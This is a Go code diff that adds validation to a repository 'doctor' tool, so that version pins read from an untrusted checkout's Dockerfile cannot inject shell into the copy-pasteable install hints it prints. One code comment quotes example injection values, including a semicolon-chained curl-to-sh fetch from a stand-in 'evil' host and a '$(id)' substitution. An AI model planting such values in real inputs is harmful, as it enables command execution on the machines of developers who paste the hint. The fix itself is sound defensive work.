@@ -380,6 +380,14 @@ func dockerfileArgDefault(data []byte, name string) string {
 	return ""
 }
 
+// dockerfilePinRe is the shape a Dockerfile-derived pin must have (after its
+// `v` / `go` prefix is trimmed) before it is formatted into a copy-pasteable
+// remedy command. The checkout is untrusted input — doctor is run against a
+// repository the operator has just cloned — and dockerfileArgDefault stops
+// only at whitespace, so an ARG such as `v2.8.0;curl${IFS}evil|sh` or
+// `1.25.6$(id)` would otherwise become shell in the `hint:` line.
+var dockerfilePinRe = regexp.MustCompile(`^[0-9]+\.[0-9]+(\.[0-9]+)?$`)
+
 // checkGolangciLintPin warns when the local golangci-lint differs from the CI
 // pin: in-loop lint can then pass while CI's gofmt/lint goes red.
 func checkGolangciLintPin(workingDir string) checkResult {
@@ -394,6 +402,10 @@ func checkGolangciLintPin(workingDir string) checkResult {
 		return checkResult{label: label, detail: "skipped — no golangci-lint pin in this checkout", status: "ok"}
 	}
 	pinnedLintVersion := strings.TrimPrefix(pin, "v")
+	if !dockerfilePinRe.MatchString(pinnedLintVersion) {
+		return checkResult{label: label, status: "ok",
+			detail: "skipped — golangci-lint pin unparseable (" + filepath.ToSlash(gateImageDockerfile) + " ARG GOLANGCI_LINT_VERSION is not vX.Y[.Z])"}
+	}
 	installHint := fmt.Sprintf("install the pinned version (`curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/v%[1]s/install.sh | "+
 		"sh -s -- -b \"$(go env GOPATH)/bin\" v%[1]s`) or run `scripts/test lint --in-gate-image` for CI parity", pinnedLintVersion)
 
@@ -467,12 +479,16 @@ func checkGoToolchainPin(workingDir string) checkResult {
 	pinText := directive[1] + "." + directive[2] + directive[3]
 
 	// The toolchain to recommend: the gate image's exact GO_VERSION when the
-	// checkout carries one, else the directive (with .0 appended so `go 1.25`
-	// yields the valid GOTOOLCHAIN value go1.25.0).
+	// checkout carries a version-shaped one (dockerfilePinRe), else the
+	// directive (with .0 appended so `go 1.25` yields the valid GOTOOLCHAIN
+	// value go1.25.0) — the directive is already digit-constrained by
+	// goDirectiveRe.
 	toolchain := ""
 	hasGateImage := false
 	if data, err := doctorReadFile(filepath.Join(root, gateImageDockerfile)); err == nil {
-		toolchain = strings.TrimPrefix(dockerfileArgDefault(data, "GO_VERSION"), "go")
+		if v := strings.TrimPrefix(dockerfileArgDefault(data, "GO_VERSION"), "go"); dockerfilePinRe.MatchString(v) {
+			toolchain = v
+		}
 		hasGateImage = true
 	}
 	if toolchain == "" {
